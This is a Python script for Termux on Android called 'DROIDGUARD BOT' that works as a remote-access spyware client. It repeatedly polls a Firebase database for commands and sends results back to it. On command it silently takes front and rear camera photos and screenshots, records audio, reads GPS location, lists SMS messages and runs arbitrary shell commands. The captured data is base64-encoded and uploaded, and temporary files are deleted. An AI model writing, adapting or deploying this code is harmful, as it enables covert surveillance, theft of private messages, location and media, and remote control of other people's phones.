#!/data/data/com.termux/files/usr/bin/python
import time, requests, hashlib, os, json, subprocess, base64

FIREBASE_URL = "https://droidguard-10597-default-rtdb.firebaseio.com/"
device_id = hashlib.md5(os.uname().nodename.encode()).hexdigest()[:8]

print(f"\n{'='*50}")
print(f"🟢 DROIDGUARD BOT")
print(f"📱 Device: {device_id}")
print(f"{'='*50}\n")

def executar_comando(acao, params):
    try:
        if acao == "bateria":
            r = subprocess.run("termux-battery-status", shell=True, capture_output=True, text=True, timeout=3)
            if r.returncode == 0:
                bat = json.loads(r.stdout)
                return {"percentage": bat.get("percentage", 0), "status": bat.get("status", "ok")}
        
        elif acao == "vibrar":
            subprocess.run(f"termux-vibrate -d {params.get('duracao', 500)}", shell=True, timeout=2)
            return {"status": "vibrou"}
        
        elif acao == "falar":
            texto = params.get("texto", "Teste")[:100]
            subprocess.run(f'termux-tts-speak "{texto}"', shell=True, timeout=5)
            return {"status": "falou", "texto": texto}
        
        elif acao == "gps":
            r = subprocess.run("termux-location -p network", shell=True, capture_output=True, text=True, timeout=8)
            if r.returncode == 0:
                gps = json.loads(r.stdout)
                return {"latitude": gps.get("latitude", 0), "longitude": gps.get("longitude", 0)}
        
        elif acao == "foto_frontal":
            arquivo = f"/sdcard/droid_{int(time.time())}.jpg"
            subprocess.run(f"termux-camera-photo -c 1 {arquivo}", shell=True, timeout=8)
            with open(arquivo, "rb") as f:
                foto = base64.b64encode(f.read()).decode()
            os.remove(arquivo)
            return {"foto": foto}
        
        elif acao == "foto_traseria":
            arquivo = f"/sdcard/droid_{int(time.time())}.jpg"
            subprocess.run(f"termux-camera-photo -c 0 {arquivo}", shell=True, timeout=8)
            with open(arquivo, "rb") as f:
                foto = base64.b64encode(f.read()).decode()
            os.remove(arquivo)
            return {"foto": foto}
        
        elif acao == "screenshot":
            arquivo = f"/sdcard/droid_{int(time.time())}.png"
            subprocess.run(f"termux-screenshot {arquivo}", shell=True, timeout=5)
            with open(arquivo, "rb") as f:
                screen = base64.b64encode(f.read()).decode()
            os.remove(arquivo)
            return {"screen": screen}
        
        elif acao == "gravar_audio":
            duracao = min(params.get("duracao", 5), 15)
            arquivo = f"/sdcard/droid_{int(time.time())}.aac"
            subprocess.run(f"termux-microphone-record -f {arquivo} -d {duracao}", shell=True, timeout=duracao+3)
            with open(arquivo, "rb") as f:
                audio = base64.b64encode(f.read()).decode()
            os.remove(arquivo)
            return {"audio": audio}
        
        elif acao == "listar_sms":
            r = subprocess.run("termux-sms-list -l 5", shell=True, capture_output=True, text=True, timeout=5)
            if r.returncode == 0:
                sms_list = json.loads(r.stdout)
                return {"sms": [{"numero": s.get("number", "?"), "texto": s.get("body", "")[:80]} for s in sms_list[:5]]}
        
        elif acao == "shell":
            cmd = params.get("cmd", "")[:200]
            r = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=5)
            return {"stdout": r.stdout[:500], "stderr": r.stderr[:200]}
        
        return {"erro": f"Comando desconhecido: {acao}"}
    except Exception as e:
        return {"erro": str(e)}

while True:
    try:
        r = requests.get(f"{FIREBASE_URL}/comandos/{device_id}.json", timeout=5)
        if r.status_code == 200 and r.json():
            for cmd_id, cmd in r.json().items():
                print(f"🎯 {cmd.get('acao')}")
                resultado = executar_comando(cmd.get("acao"), cmd.get("params", {}))
                resultado["timestamp"] = time.time()
                requests.put(f"{FIREBASE_URL}/resultados/{device_id}/{cmd_id}.json", json=resultado, timeout=3)
                requests.delete(f"{FIREBASE_URL}/comandos/{device_id}/{cmd_id}.json")
                print(f"  ✅ Respondido")
        
        requests.patch(f"{FIREBASE_URL}/dispositivos/{device_id}.json", 
                      json={"status": "online", "timestamp": time.time()}, timeout=3)
        time.sleep(2)
    except Exception as e:
        print(f"⚠️ {e}")
        time.sleep(5)
